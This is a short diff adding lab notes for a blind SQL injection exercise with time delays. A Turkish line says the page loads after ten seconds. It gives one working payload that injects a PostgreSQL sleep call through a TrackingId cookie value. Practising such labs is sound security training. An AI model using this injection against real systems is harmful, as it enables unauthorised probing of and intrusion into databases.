@@ -1,0 +1,4 @@
+LAB: Blind SQL injection with time delays
+
+1 - 10 saniye sonra sayfa yüklenecektir.
+TrackingId=x'||pg_sleep(10)--
